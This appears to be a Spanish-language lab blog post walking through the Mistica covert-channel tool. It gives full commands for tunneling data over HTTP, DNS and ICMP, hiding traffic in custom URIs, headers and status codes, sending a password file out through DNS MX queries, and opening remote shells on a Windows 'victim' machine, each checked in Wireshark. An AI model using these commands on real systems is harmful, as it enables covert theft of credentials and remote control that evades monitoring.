---
title: Data Exfiltration - Mistica
date: 2021-01-08 19:17:00 Z
---

![Mistica.png]({{site.baseurl}}/images/Mistica/Mistica.png)

[https://github.com/IncideDigital/Mistica](https://github.com/IncideDigital/Mistica)


Mistica is a tool that allows to **embed data into application layer protocol fields**, with the g**oal of establishing a bi-directional channel for arbitrary communications**. Currently, **encapsulation into HTTP, DNS and ICMP protocols** has been implemented, but more protocols are expected to be introduced in the near future.


Mística has a modular design, **built around a custom transport protocol, called SOTP**: Simple Overlay Transport Protocol. **Data is encrypted, chunked and put into SOTP packets. SOTP packets are encoded and embedded into the desired field of the application protocol, and sent to the other end.**


SOTP, cifra los datos en pequeños bloques y los introduce en protocolos de aplicación.
Podemos partir un fichero en cachitos y transportarlo en SOTP. 

Dota a nuestros canales con unas características especiales para poderlo encapsular el protocolo SOTP, en los protocolos DNS,ICMP.

Aparte, tienes unas características esenciales, es bidereccional, cifrado y confidencial.

Uno de los creadores, lo documenta mucho mejor que yo:
[https://www.youtube.com/watch?v=xMNAhPkyRmc](https://www.youtube.com/watch?v=xMNAhPkyRmc)

Otra referencia sobre la herramienta
[https://darkbyte.net/jugando-con-remote-shells-parte-iii-mistica/](https://darkbyte.net/jugando-con-remote-shells-parte-iii-mistica/)


El objetivo será mostrar el funcionamiento de los diferentes protocolos.
Y ver la información y rastro que nos muestra WireShark.

***No soy un experto ni mucho menos.**

### Encapsulación HTTP

La comunicación se producirá a través del protocolo web http, con el objetivo de evitar detecciones, intentaremos mezclamos con el tráfico existente.


Este protocolo es muy utilizado por los chungos, ya que hay procesos internos en entornos Windows que utilizan este protocolo, como las actualizaciones de Windows.


Como veremos en los siguientes ejemplos, haremos uso de las propiedades de HTTP, como son las cabeceras e introduciremos los datos.


Más información: [https://attack.mitre.org/techniques/T1071/001/](https://attack.mitre.org/techniques/T1071/001/)

**Servidor**

`
./ms.py -m io:http -s "--hostname 0.0.0.0 --port 80" -k Key
`
![image093.png]({{site.baseurl}}/images/Mistica/image093.png)
**Cliente**

`
python.exe C:\Users\Sergio\Downloads\Mistica-master\mc.py -m io:http -w "--hostname 192.168.1.142 --port 80" -k key
`
![image094.png]({{site.baseurl}}/images/Mistica/image094.png)

Una vez producida la conexión no se nos muestra ningún banner.

Realizamos una prueba, desde el cliente Windows, nos comunicamos con el servidor:

![image095.png]({{site.baseurl}}/images/Mistica/image095.png)

Y en el servidor nos mostrará este mismo mensaje.

![image096.png]({{site.baseurl}}/images/Mistica/image096.png)

**Es biderecional, la comunicación se puede realizar tanto desde el cliente como del servidor.**

Analizamos la información con WireShark.

Primero vamos a realizar el filtrado, en este caso, indicando únicamente el protcolo http, nos mostrará las conexiones que se han ido realizando entre estos equipos.

Server Parrot: 192.168.1.142

Cliente Windows : 192.168.1.139

![image097.png]({{site.baseurl}}/images/Mistica/image097.png)

Podemos observar como el cliente (192.168.1.139) está constantemente realizando solicitudes get al servidor, esto es una funcionalidad de los Overlays, se encargan de preguntar constantemente al servidor.

La información va cifrada en RC4

![image098.png]({{site.baseurl}}/images/Mistica/image098.png)


En los paquetes HTTP generados por un navegador web, nos muestra el User-Agent, en este caso vemos que no.

### Customización de URI

Servidor

`python3.8 ms.py -m io:http -s "--hostname 0.0.0.0 --port 80" -w "--uri /?token=" -k key`
![image007.png]({{site.baseurl}}/images/Mistica/image007.png)

Cliente

`python.exe C:\Users\Sergio\Downloads\Mistica-master\mc.py -m io:http -w "--hostname 192.168.1.142 --port 80 --header token" -k key`

![image100.png]({{site.baseurl}}/images/Mistica/image100.png)

A través de WireShark lo entenderemos mejor.

![image101.png]({{site.baseurl}}/images/Mistica/image101.png)

Observamos, como hemos modificado la uri, indicando que el paquete OSTP sea transportado a continuación de “**/?token=**”

### HEADER

En este ejemplo, la información será transmitida por una cabecera customizada de HTTP

**Servidor**

`python3.8 ms.py -m io:http -s "--hostname 0.0.0.0 --port 80" -w "--header token" -k key`
![image102.png]({{site.baseurl}}/images/Mistica/image102.png)

**Cliente**

`python.exe C:\Users\Sergio\Downloads\Mistica-master\mc.py -m io:http -w "--hostname 192.168.1.142 --port 80 --header token" -k key
`
![image103.png]({{site.baseurl}}/images/Mistica/image103.png)

Realizamos una prueba entre ambos equipos.
Y vemos la información en WireShark de la siguiente forma:

![image104.png]({{site.baseurl}}/images/Mistica/image104.png)

Como vemos, ya no aparece nada en la uri, si vemos las peticiones, la información se mostrará dentro del header token, creada anteriormente.

![image105.png]({{site.baseurl}}/images/Mistica/image105.png)


### URI Custom + Responde Code HTTP

Otra opción interesante es combinar una uri customizada con un código de respuesta HTTP customizado.

¡Esta opción me ha encantado!


**Servidor**


![image106.png]({{site.baseurl}}/images/Mistica/image106.png)

`python3.8 ms.py -m io:http -s "--hostname 0.0.0.0 --port 80" -w "--uri /?token= --success-code 302" -k key
`


**Cliente**

`python.exe C:\Users\Sergio\Downloads\Mistica-master\mc.py -m io:http -w "--hostname 192.168.1.142 --port 80 --uri /?token= --success-code 302" -k key`

![image107.png]({{site.baseurl}}/images/Mistica/image107.png)

A través de WireShark, vemos como la información es enviado en la URI customizada, y el código de respuesta es 302 (redirección)

![image108.png]({{site.baseurl}}/images/Mistica/image108.png)

Esto podríamos modificarlo, que fuese un 404 de un fichero no encontrado por ejemplo. 
Únicamente, debemos modificar el 302 por 404 en los comandos anteriores.

![image109.png]({{site.baseurl}}/images/Mistica/image109.png)


### DNS

Tengo la impresión, pero desconozco, de que este protocolo no es monitorizado por las compañías y tampoco bloqueado por los FW.

El objetivo es darle un uso no genérico al que todos conocemos.

Más información: [https://attack.mitre.org/techniques/T1071/004/](https://attack.mitre.org/techniques/T1071/004/)


**Servidor**
`python3.8 ms.py -m io:dns -s "--hostname 0.0.0.0 --port 53" -w "--queries MX" -k key`

![image110.png]({{site.baseurl}}/images/Mistica/image110.png)

Cliente:

`python.exe C:\Users\Sergio\Downloads\Mistica-master\mc.py -m io:dns -w "--hostname 192.168.1.142 --port 53 --query MX" -k key`

![image111.png]({{site.baseurl}}/images/Mistica/image111.png)

Veamos las peticiones DNS realizadas.
Podríamos crear servidores dns autorizados….

![image112.png]({{site.baseurl}}/images/Mistica/image112.png)

Podemos observar como la conexión es realizada por el protocolo UDP y el puerto de destino es el 53

![image113.png]({{site.baseurl}}/images/Mistica/image113.png)

Y las consulta van encodeadas en el registro MX


![image114.png]({{site.baseurl}}/images/Mistica/image114.png)

### ICMP

Hemos visto el protocolo HTTP, DNS, y por último tenemos ICMP.

Servidor:

`python3.8 ms.py -m io:icmp -s "--iface eth0" -k key`


![image118.png]({{site.baseurl}}/images/Mistica/image118.png)

Cliente

`python.exe C:\Users\Sergio\Downloads\Mistica-master\mc.py -m io:icmp -w "--hostname 192.168.1.142" -k key`

![image119.png]({{site.baseurl}}/images/Mistica/image119.png)

Realiamoz la comunicación entre servidor y cliente.

El tráfico generado:

![image120.png]({{site.baseurl}}/images/Mistica/image120.png)

Si analizamos la trama 56

![image121.png]({{site.baseurl}}/images/Mistica/image121.png)

El type tiene un valor 8, lo que nos indica que es una solicitud.
Otro valor importante es el Data.

Analizamos la trama 57

![image122.png]({{site.baseurl}}/images/Mistica/image122.png)

El tipo es 0, confirmándonos que se trata de la respuesta.


### Exfiltración de datos


En el siguiente ejemplo, vamos a transferir ficheros desde el cliente al servidor a través del protocolo DNS.

Servidor:

`python3.8 ms.py -m io:dns -s "--hostname 0.0.0.0 --port 53" -w "--queries MX" -k key `


![image115.png]({{site.baseurl}}/images/Mistica/image115.png)

Cliente

Desde CMD:
`python.exe C:\Users\Sergio\Downloads\Mistica-master\mc.py -m io:dns -w "--hostname 192.168.1.142 --port 53 --query MX" -k key < C:\Users\Sergio\Downloads\Mistica-master\contraseñas.txt`


![image116.png]({{site.baseurl}}/images/Mistica/image116.png)

Redireccionamos la información del fichero contraseñas.txt, es un ejemplo, y contiene dos usuarios y sus passwords


Y vemos como la información se nos muestra en pantalla.
![image117.png]({{site.baseurl}}/images/Mistica/image117.png)

Podemos redirigir la información a un fichero tocando disco.


Es una forma creativa para exfiltrar información, utilizando protocolos comunes.

### SHELL

## Shell - HTTP

Podemos ejecutar comandos de manera remota, combinando los módulos shell e io.
Si queremos ejecutar comandos en el cliente


Servidor:
`python3.8 ms.py -m io:http -s "--hostname 0.0.0.0 --port 80" -w "--header User-Agent= --success-code 404" -k key`

![image123.png]({{site.baseurl}}/images/Mistica/image123.png)

Cliente:
`python.exe C:\Users\Sergio\Downloads\Mistica-master\mc.py -m shell:http -w "--hostname 192.168.1.142 --port 80 --header User-Agent= --success-code 404" -k key`

![image124.png]({{site.baseurl}}/images/Mistica/image124.png)

Como veremos en el siguientes ejemplo, y de manera de dejar claro las prueba realizada, en el servidor, es decir, nuestro equipo atacante, nuestro Parrot, vamos a escribir los comandos hostname y un ipconfig, el cuál, mostrará información de nuestro equipo Windows.

Indicamos el Servidor con io:http y el cliente, donde se ejecutará los comandos, con shell:http.

![image125.png]({{site.baseurl}}/images/Mistica/image125.png)

Los paquetes capturados por WireShark:

![image130.png]({{site.baseurl}}/images/Mistica/image130.png)

Como vemos, el código que nos devuelve Firefox es un 404, si analizamos un paquete:

![image131.png]({{site.baseurl}}/images/Mistica/image131.png)

Vemos una nueva cabecera llamada User-Agent donde codificada la información.

## Shell - DNS

Servidor:
`python3.8 ms.py -m io:dns -s "--hostname 0.0.0.0 --port 5051" -w "--queries SOA" -k key`

![image132.png]({{site.baseurl}}/images/Mistica/image132.png)

Cliente:
python.exe C:\Users\Sergio\Downloads\Mistica-master\mc.py -m shell:dns -w "--hostname 192.168.1.142 --port 5051 --query SOA" -k key

![image133.png]({{site.baseurl}}/images/Mistica/image133.png)

Podremos ejecutar commandos de manera remota en nuestro parrot:

![image134.png]({{site.baseurl}}/images/Mistica/image134.png)

El tráfico generado:

![image135.png]({{site.baseurl}}/images/Mistica/image135.png)

Como vemos el protocolo utilizado es UDP en vez de DNS, esto es porque hemos indicado el puerto 5051, esto llamaría mucha la atención.


SHELL - ICMP

Servidor
python3.8 ms.py -m io:icmp -s "--iface eth0" -k key

![image136.png]({{site.baseurl}}/images/Mistica/image136.png)

Cliente
python.exe C:\Users\Sergio\Downloads\Mistica-master\mc.py -m shell:icmp -w "--hostname 192.168.1.142" -k key
![image137.png]({{site.baseurl}}/images/Mistica/image137.png)

Y ejecutamos comandos sobre la maquina víctima a través del protocolo ICMP 😊


![image138.png]({{site.baseurl}}/images/Mistica/image138.png)


